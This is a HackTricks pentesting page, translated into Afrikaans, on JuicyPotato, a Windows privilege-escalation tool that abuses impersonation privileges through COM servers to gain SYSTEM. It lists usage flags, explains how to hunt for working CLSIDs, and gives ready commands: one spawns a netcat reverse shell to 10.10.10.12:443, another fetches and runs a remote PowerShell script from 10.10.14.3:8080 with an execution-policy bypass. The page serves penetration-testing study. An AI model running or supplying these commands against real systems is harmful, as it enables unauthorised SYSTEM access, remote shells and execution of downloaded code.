# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > **JuicyPotato werk nie** op Windows Server 2019 en Windows 10 weergawe 1809 en later nie. Tog kan [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) gebruik word om **die selfde voorregte te benut en `NT AUTHORITY\SYSTEM`** vlak toegang te verkry. _**Kontroleer:**_

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (misbruik van die goue voorregte) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_'n Gesuikerde weergawe van_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, met 'n bietjie sap, d.w.s. **nog 'n Plaaslike Voorreg Escalation hulpmiddel, van 'n Windows Diens Rekeninge na NT AUTHORITY\SYSTEM**_

#### Jy kan juicypotato aflaai van [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Samevatting <a href="#summary" id="summary"></a>

[**Van juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) en sy [variantes](https://github.com/decoder-it/lonelypotato) benut die voorregte eskalasieketting gebaseer op [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [diens](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) wat die MiTM luisteraar op `127.0.0.1:6666` het en wanneer jy `SeImpersonate` of `SeAssignPrimaryToken` voorregte het. Tydens 'n Windows weergawe hersiening het ons 'n opstelling gevind waar `BITS` doelbewus gedeaktiveer was en poort `6666` geneem is.

Ons het besluit om [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) te wapen: **Sê hallo vir Juicy Potato**.

> Vir die teorie, sien [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) en volg die ketting van skakels en verwysings.

Ons het ontdek dat, behalwe `BITS`, daar 'n aantal COM bedieners is wat ons kan misbruik. Hulle moet net:

1. deur die huidige gebruiker instantiëerbaar wees, normaalweg 'n “diens gebruiker” wat impersonasie voorregte het
2. die `IMarshal`-koppelvlak implementeer
3. as 'n verhoogde gebruiker (SYSTEM, Administrateur, …) loop

Na 'n paar toetse het ons 'n uitgebreide lys van [interessante CLSID's](http://ohpe.it/juicy-potato/CLSID/) op verskeie Windows weergawes verkry en getoets.

### Juicy besonderhede <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato laat jou toe om:

- **Teiken CLSID** _kies enige CLSID wat jy wil._ [_Hier_](http://ohpe.it/juicy-potato/CLSID/) _kan jy die lys vind wat volgens OS georganiseer is._
- **COM Luisterpoort** _definieer die COM luisterpoort wat jy verkies (in plaas van die gemarshalled hardcoded 6666)_
- **COM Luister IP adres** _bind die bediener op enige IP_
- **Proses skepping modus** _afhangende van die impersonasie gebruiker se voorregte kan jy kies uit:_
- `CreateProcessWithToken` (benodig `SeImpersonate`)
- `CreateProcessAsUser` (benodig `SeAssignPrimaryToken`)
- `albei`
- **Proses om te begin** _begin 'n uitvoerbare of skrip as die uitbuiting slaag_
- **Proses Argument** _pas die begin proses argumente aan_
- **RPC Server adres** _vir 'n stealthy benadering kan jy autentiseer by 'n eksterne RPC bediener_
- **RPC Server poort** _nuttig as jy wil autentiseer by 'n eksterne bediener en die vuurmuur blokkeer poort `135`…_
- **TOETS modus** _hoofsaaklik vir toetsdoeleindes, d.w.s. toets CLSIDs. Dit skep die DCOM en druk die gebruiker van die token. Sien_ [_hier vir toetsing_](http://ohpe.it/juicy-potato/Test/)

### Gebruik <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Finale gedagtes <a href="#final-thoughts" id="final-thoughts"></a>

[**Uit juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

As die gebruiker `SeImpersonate` of `SeAssignPrimaryToken` regte het, dan is jy **SYSTEM**.

Dit is byna onmoontlik om die misbruik van al hierdie COM Servers te voorkom. Jy kan dink aan die aanpassing van die regte van hierdie voorwerpe via `DCOMCNFG`, maar goeie geluk, dit gaan uitdagend wees.

Die werklike oplossing is om sensitiewe rekeninge en toepassings wat onder die `* SERVICE` rekeninge loop, te beskerm. Om `DCOM` te stop, sal beslis hierdie uitbuiting beperk, maar kan 'n ernstige impak op die onderliggende OS hê.

Van: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## Voorbeelde

Nota: Besoek [hierdie bladsy](https://ohpe.it/juicy-potato/CLSID/) vir 'n lys van CLSIDs om te probeer.

### Kry 'n nc.exe omgekeerde skulp
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Begin 'n nuwe CMD (as jy RDP-toegang het)

![](<../../images/image (300).png>)

## CLSID Probleme

Dikwels werk die standaard CLSID wat JuicyPotato gebruik **nie** en die exploit misluk. Gewoonlik neem dit verskeie pogings om 'n **werkende CLSID** te vind. Om 'n lys van CLSIDs te kry om vir 'n spesifieke bedryfstelsel te probeer, moet jy hierdie bladsy besoek:

{{#ref}}
https://ohpe.it/juicy-potato/CLSID/
{{#endref}}

### **Kontroleer CLSIDs**

Eerstens, jy sal 'n paar uitvoerbare lêers nodig hê behalwe juicypotato.exe.

Laai [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) af en laai dit in jou PS-sessie, en laai en voer [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1) uit. Daardie skrip sal 'n lys van moontlike CLSIDs skep om te toets.

Laai dan [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat) af (verander die pad na die CLSID lys en na die juicypotato uitvoerbare lêer) en voer dit uit. Dit sal begin om elke CLSID te probeer, en **wanneer die poortnommer verander, sal dit beteken dat die CLSID gewerk het**.

**Kontroleer** die werkende CLSIDs **met die parameter -c**

## Verwysings

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)

{{#include ../../banners/hacktricks-training.md}}
